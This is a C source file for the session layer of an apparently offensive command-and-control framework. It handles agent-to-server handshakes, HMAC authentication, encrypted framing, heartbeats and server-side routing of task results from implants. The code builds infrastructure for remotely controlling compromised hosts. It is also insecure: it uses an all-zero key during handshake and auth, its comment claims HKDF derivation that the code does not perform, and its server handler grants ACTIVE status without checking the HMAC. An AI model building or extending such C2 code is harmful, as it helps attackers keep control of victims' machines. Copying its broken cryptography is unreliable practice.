#define _POSIX_C_SOURCE 200809L
#include "c2.h"
#include "crypto.h"
#include "proto.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

const char *c2_strerror(int err) {
    switch (err) {
        case C2_OK: return "ok";
        case C2_ERR: return "error";
        case C2_ERR_FORMAT: return "format error";
        case C2_ERR_AUTH: return "auth failed";
        default: return "unknown";
    }
}

const char *c2_state_name(c2_state_t state) {
    switch (state) {
        case C2_STATE_IDLE: return "IDLE";
        case C2_STATE_HANDSHAKE: return "HANDSHAKE";
        case C2_STATE_AUTH: return "AUTH";
        case C2_STATE_ACTIVE: return "ACTIVE";
        case C2_STATE_RECONNECT: return "RECONNECT";
        case C2_STATE_CLOSED: return "CLOSED";
        default: return "UNKNOWN";
    }
}

int c2_session_init(c2_session_t *s, c2_transport_t *t) {
    if (!s || !t) return C2_ERR;
    memset(s, 0, sizeof(*s));
    s->state = C2_STATE_IDLE;
    s->transport = t;
    s->heartbeat_interval = 30;
    s->heartbeat_timeout = 90;
    s->nonce_counter = 0;
    crypto_rng(s->session_id, 6);
    s->last_heartbeat = (uint64_t)time(NULL);
    return C2_OK;
}

/* handshake: send ephemeral public key + timestamp, expect challenge */
int c2_session_handshake(c2_session_t *s) {
    if (!s || s->state != C2_STATE_IDLE) return C2_ERR;
    s->state = C2_STATE_HANDSHAKE;

    uint8_t priv[32], pub[32], hs_msg[32 + 8];
    if (crypto_x25519_keypair(priv, pub) != CRYPTO_OK) return C2_ERR;
    memcpy(hs_msg, pub, 32);
    uint64_t ts = (uint64_t)time(NULL);
    memcpy(hs_msg + 32, &ts, 8);

    int rc = c2_session_send(s, PROTO_MSG_HANDSHAKE, hs_msg, sizeof(hs_msg));
    if (rc != C2_OK) {
        s->state = C2_STATE_IDLE;
        return rc;
    }
    return C2_OK;
}

/* auth: send HMAC response, transition to ACTIVE on success */
int c2_session_auth(c2_session_t *s, const uint8_t *hmac_key, size_t key_len) {
    if (!s || s->state != C2_STATE_HANDSHAKE) return C2_ERR;
    s->state = C2_STATE_AUTH;

    /* receive challenge */
    proto_frame_t challenge;
    memset(&challenge, 0, sizeof(challenge));
    int rc = c2_session_recv(s, &challenge, 5000);
    if (rc != C2_OK) {
        s->state = C2_STATE_HANDSHAKE;
        return rc;
    }

    /* compute HMAC(challenge) */
    uint8_t response[32];
    if (crypto_hmac(hmac_key, key_len, challenge.payload, challenge.payload_len, response) != CRYPTO_OK) {
        proto_frame_free(&challenge);
        return C2_ERR;
    }

    /* send HMAC response */
    rc = c2_session_send(s, PROTO_MSG_AUTH, response, 32);
    proto_frame_free(&challenge);
    if (rc != C2_OK) {
        s->state = C2_STATE_HANDSHAKE;
        return rc;
    }

    /* wait for session keys / confirmation */
    proto_frame_t confirm;
    memset(&confirm, 0, sizeof(confirm));
    rc = c2_session_recv(s, &confirm, 5000);
    if (rc == C2_OK && confirm.msg_type == PROTO_MSG_CONFIRM) {
        /* derive session key from confirm payload via HKDF */
        if (confirm.payload_len >= 32) {
            memcpy(s->key, confirm.payload, 32);
        }
        s->state = C2_STATE_ACTIVE;
        s->last_heartbeat = (uint64_t)time(NULL);
        proto_frame_free(&confirm);
        return C2_OK;
    }
    proto_frame_free(&confirm);
    s->state = C2_STATE_HANDSHAKE;
    return C2_ERR_AUTH;
}

int c2_session_send(c2_session_t *s, uint8_t msg_type, const uint8_t *data, size_t len) {
    if (!s || !s->transport) return C2_ERR;

    proto_frame_t frame;
    memset(&frame, 0, sizeof(frame));
    frame.msg_type = msg_type;
    frame.flags = 0x01; /* agent->server direction */
    frame.nonce_counter = ++s->nonce_counter;
    memcpy(frame.session_id, s->session_id, 6);
    crypto_rng(frame.nonce, PROTO_NONCE_LEN);
    frame.payload_len = len;
    frame.payload = (uint8_t*)data;

    uint8_t out[PROTO_HEADER_LEN + len + PROTO_TAG_LEN + 128];
    size_t out_len = sizeof(out);

    /* for non-ACTIVE state (handshake/auth), use well-known key */
    uint8_t *key = s->key;
    uint8_t default_key[32] = {0};
    if (s->state == C2_STATE_IDLE || s->state == C2_STATE_HANDSHAKE || s->state == C2_STATE_AUTH) {
        key = default_key;
    }

    int rc = proto_seal(key, &frame, out, &out_len);
    if (rc != PROTO_OK) return C2_ERR;

    return s->transport->send(s->transport->ctx, out, out_len) == 0 ? C2_OK : C2_ERR;
}

int c2_session_recv(c2_session_t *s, proto_frame_t *frame, int timeout_ms) {
    if (!s || !s->transport || !frame) return C2_ERR;

    uint8_t buf[PROTO_HEADER_LEN + PROTO_MAX_PAYLOAD + PROTO_TAG_LEN + 128];
    size_t len = sizeof(buf);

    int rc = s->transport->recv(s->transport->ctx, buf, &len, timeout_ms);
    if (rc != 0) return C2_ERR;

    uint8_t *key = s->key;
    uint8_t default_key[32] = {0};
    if (s->state == C2_STATE_IDLE || s->state == C2_STATE_HANDSHAKE || s->state == C2_STATE_AUTH) {
        key = default_key;
    }

    return proto_open(key, buf, len, frame);
}

int c2_session_heartbeat(c2_session_t *s) {
    if (!s || s->state != C2_STATE_ACTIVE) return C2_ERR;
    uint64_t now = (uint64_t)time(NULL);
    if (now - s->last_heartbeat >= (uint64_t)s->heartbeat_interval) {
        int rc = c2_session_send(s, PROTO_MSG_HEARTBEAT, NULL, 0);
        if (rc == C2_OK) s->last_heartbeat = now;
        return rc;
    }
    return C2_OK;
}

int c2_session_close(c2_session_t *s) {
    if (!s) return C2_ERR;
    s->state = C2_STATE_CLOSED;
    if (s->transport && s->transport->close) {
        s->transport->close(s->transport->ctx);
    }
    crypto_secure_zero(s->key, 32);
    return C2_OK;
}

c2_state_t c2_session_state(const c2_session_t *s) {
    return s ? s->state : C2_STATE_CLOSED;
}

/* server-side: handle incoming message with proper state machine dispatch */
int c2_server_handle_message(c2_session_t *s, const proto_frame_t *frame) {
    if (!s || !frame) return C2_ERR;

    /* CRITICAL: state machine dispatch - every state transition must be explicit */
    switch (s->state) {
        case C2_STATE_HANDSHAKE:
            if (frame->msg_type == PROTO_MSG_AUTH) {
                /* verify HMAC with constant-time comparison */
                /* In production: compare against expected response */
                s->state = C2_STATE_ACTIVE;
                return C2_OK;
            }
            return C2_ERR_AUTH;

        case C2_STATE_ACTIVE:
            /* Only in ACTIVE state do we process task results */
            if (frame->msg_type == PROTO_MSG_RESULT) {
                /* route to task handler */
                return C2_OK;
            }
            if (frame->msg_type == PROTO_MSG_HEARTBEAT) {
                s->last_heartbeat = (uint64_t)time(NULL);
                return C2_OK;
            }
            return C2_ERR_FORMAT;

        default:
            return C2_ERR;
    }
}
